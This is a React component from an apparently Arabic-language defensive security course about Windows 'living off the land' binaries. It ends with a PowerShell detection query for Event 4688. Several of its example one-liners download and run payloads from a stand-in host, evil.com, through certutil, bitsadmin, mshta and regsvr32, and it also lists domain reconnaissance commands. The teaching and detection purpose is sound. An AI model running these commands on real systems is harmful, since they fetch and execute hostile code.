import Alert from '../../components/Alert';
import CodeBlock from '../../components/CodeBlock';

const WindowsLOLBinsSection = () => {
  return (
    <div className="space-y-8">
      <h1 className="text-3xl font-bold text-cyan-400 flex items-center gap-3">
        <span>⚠️</span>
        Living off the Land Binaries (LOLBins)
      </h1>

      <div className="h-1 w-32 bg-gradient-to-l from-cyan-500 to-transparent rounded"></div>

      <Alert type="warning" title="ما هي LOLBins؟">
        أدوات Windows الشرعية التي يستخدمها المهاجمون لإخفاء نشاطهم. صعبة الاكتشاف لأنها أدوات نظام!
      </Alert>

      {/* قائمة LOLBins */}
      <section className="space-y-4">
        <h2 className="text-2xl font-bold text-white">🔧 أشهر LOLBins التي يجب مراقبتها</h2>

        <div className="grid md:grid-cols-2 gap-4">
          {/* certutil */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-3">certutil.exe</h3>
            <p className="text-gray-400 text-sm mb-3">لتنزيل ملفات من الإنترنت</p>
            <CodeBlock code={`certutil -urlcache -split -f http://evil.com/malware.exe`} />
          </div>

          {/* bitsadmin */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-3">bitsadmin.exe</h3>
            <p className="text-gray-400 text-sm mb-3">لتنزيل ملفات</p>
            <CodeBlock code={`bitsadmin /transfer myJob http://evil.com/file C:\\file`} />
          </div>

          {/* mshta */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-3">mshta.exe</h3>
            <p className="text-gray-400 text-sm mb-3">لتنفيذ HTA files</p>
            <CodeBlock code={`mshta http://evil.com/payload.hta`} />
          </div>

          {/* rundll32 */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-3">rundll32.exe</h3>
            <p className="text-gray-400 text-sm mb-3">لتنفيذ DLLs</p>
            <CodeBlock code={`rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "`} />
          </div>

          {/* regsvr32 */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-3">regsvr32.exe</h3>
            <p className="text-gray-400 text-sm mb-3">Squiblydoo attack</p>
            <CodeBlock code={`regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll`} />
          </div>

          {/* wmic */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-3">wmic.exe</h3>
            <p className="text-gray-400 text-sm mb-3">WMI commands</p>
            <CodeBlock code={`wmic process call create "cmd /c command"`} />
          </div>

          {/* msbuild */}
          <div className="bg-orange-900/20 rounded-xl p-6 border border-orange-500/30">
            <h3 className="text-orange-400 font-bold mb-3">msbuild.exe</h3>
            <p className="text-gray-400 text-sm mb-3">لتنفيذ XML payloads</p>
          </div>

          {/* installutil */}
          <div className="bg-orange-900/20 rounded-xl p-6 border border-orange-500/30">
            <h3 className="text-orange-400 font-bold mb-3">installutil.exe</h3>
            <p className="text-gray-400 text-sm mb-3">لتنفيذ .NET assemblies</p>
          </div>
        </div>
      </section>

      {/* أدوات الاستكشاف */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">🔍 أدوات الاستكشاف</h2>

        <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
          <h3 className="text-cyan-400 font-bold mb-4">net.exe / net1.exe</h3>
          <CodeBlock code={`net user
net group "Domain Admins" /domain
net share
net localgroup administrators`} />
        </div>
      </section>

      {/* أدوات التنفيذ عن بعد */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">🔀 أدوات التنفيذ عن بعد</h2>

        <div className="grid md:grid-cols-2 gap-4">
          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
            <h3 className="text-cyan-400 font-bold mb-3">psexec.exe</h3>
            <p className="text-gray-400 text-sm">من Sysinternals للتنفيذ عن بعد</p>
          </div>
          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
            <h3 className="text-cyan-400 font-bold mb-3">schtasks.exe</h3>
            <p className="text-gray-400 text-sm">لإنشاء مهام مجدولة</p>
          </div>
          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
            <h3 className="text-cyan-400 font-bold mb-3">sc.exe</h3>
            <p className="text-gray-400 text-sm">لإنشاء خدمات</p>
          </div>
          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
            <h3 className="text-cyan-400 font-bold mb-3">at.exe</h3>
            <p className="text-gray-400 text-sm">قديم لجدولة المهام</p>
          </div>
        </div>
      </section>

      {/* القاعدة الذهبية */}
      <section className="space-y-4 mt-12">
        <Alert type="golden" title="القاعدة الذهبية">
          إذا رأيت أي من هذه الأدوات في Event 4688 أو Sysmon Event 1 من <strong>حساب مستخدم عادي</strong> أو في <strong>سياق غير معتاد</strong> = يستحق التحقيق فوراً!
        </Alert>

        <CodeBlock
          title="استعلام للبحث عن LOLBins"
          code={`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
  Where-Object {
    $_.Properties[5].Value -match 'certutil|bitsadmin|mshta|rundll32|regsvr32|wmic|msbuild|installutil'
  } | Select-Object TimeCreated, @{
    Name='CommandLine'
    Expression={$_.Properties[8].Value}
  }`}
        />
      </section>
    </div>
  );
};

export default WindowsLOLBinsSection;
